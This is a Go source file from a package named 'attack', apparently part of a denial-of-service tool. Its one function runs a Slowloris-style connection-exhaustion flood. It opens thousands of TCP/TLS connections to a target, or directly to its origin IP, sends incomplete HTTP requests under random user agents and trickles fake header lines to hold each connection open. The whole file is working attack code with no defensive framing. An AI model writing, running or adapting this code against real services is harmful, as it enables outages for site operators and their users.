package attack

import (
	"crypto/tls"
	"log"
	"net"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
)

func runConnectionFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	target := cfg.Target
	host := target
	port := "443"
	useTLS := true

	if u, err := url.Parse(target); err == nil && u.Hostname() != "" {
		host = u.Hostname()
		if u.Port() != "" {
			port = u.Port()
		} else {
			if u.Scheme == "http" {
				port = "80"
				useTLS = false
			}
		}
	}

	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	maxConns := cfg.MaxConns
	if maxConns < 1000 {
		maxConns = 5000
	}

	dialPhaseBudget := time.Duration(cfg.Duration) * time.Second
	if dialPhaseBudget > 30*time.Second {
		dialPhaseBudget = 30 * time.Second
	}
	dialDeadline := startTime.Add(dialPhaseBudget)

	log.Printf("Connection Exhaustion: opening up to %d TCP connections to %s:%s (dial budget: %v)", maxConns, host, port, dialPhaseBudget)

	connections := make([]net.Conn, 0, maxConns)
	var connMu sync.Mutex

	semaphore := make(chan struct{}, 200)

	var wg sync.WaitGroup
	var dialed int32
	for i := 0; i < maxConns; i++ {
		if time.Now().After(dialDeadline) || atomic.LoadInt32(&stopFlag) == 1 {
			break
		}
		wg.Add(1)
		semaphore <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-semaphore }()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("ConnFlood recovered: %v", r)
				}
			}()

			if atomic.LoadInt32(&stopFlag) == 1 {
				return
			}

			dial := createDialer("", 5*time.Second)
			conn, err := dial("tcp", host+":"+port)
			if err != nil {
				atomic.AddInt64(&metrics.Failed, 1)
				return
			}

			if tcpConn, ok := conn.(*net.TCPConn); ok {
				tcpConn.SetKeepAlive(true)
				tcpConn.SetKeepAlivePeriod(30 * time.Second)
				tcpConn.SetNoDelay(true)
			}

			if useTLS {
				tlsConn := tls.Client(conn, &tls.Config{
					InsecureSkipVerify: true,
					ServerName:         host,
				})
				tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
				if err := tlsConn.Handshake(); err != nil {
					conn.Close()
					atomic.AddInt64(&metrics.Failed, 1)
					return
				}
				tlsConn.SetDeadline(time.Time{})
				conn = tlsConn
			}

			partial := []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: " + randomUA() + "\r\n")
			conn.Write(partial)

			connMu.Lock()
			connections = append(connections, conn)
			connMu.Unlock()

			atomic.AddInt64(&metrics.Completed, 1)
			atomic.AddInt64(&metrics.TotalRequests, 1)
			atomic.AddInt64(&metrics.InFlight, 1)
			atomic.AddInt32(&dialed, 1)
		}()
	}

	wg.Wait()

	openCount := atomic.LoadInt32(&dialed)
	log.Printf("Held %d TCP connections, sustaining for remaining duration", openCount)

	keepAliveTicker := time.NewTicker(15 * time.Second)
	defer keepAliveTicker.Stop()

	for time.Now().Before(deadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			break
		}

		select {
		case <-keepAliveTicker.C:
			connMu.Lock()
			var alive []net.Conn
			for _, conn := range connections {
				_, err := conn.Write([]byte("X-Keep-Alive: " + randomUA() + "\r\n"))
				if err == nil {
					alive = append(alive, conn)
				} else {
					conn.Close()
					atomic.AddInt64(&metrics.InFlight, -1)
					atomic.AddInt32(&dialed, -1)
				}
			}
			connections = alive
			connMu.Unlock()
			log.Printf("Keep-alive cycle: %d connections still active", atomic.LoadInt32(&dialed))
		case <-time.After(1 * time.Second):
		}
	}

	connMu.Lock()
	for _, conn := range connections {
		conn.Close()
		atomic.AddInt64(&metrics.InFlight, -1)
	}
	connections = nil
	connMu.Unlock()

	atomic.StoreInt64(&metrics.InFlight, 0)

	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metrics.CurrentRPS = 0
	metricsMu.Unlock()
}
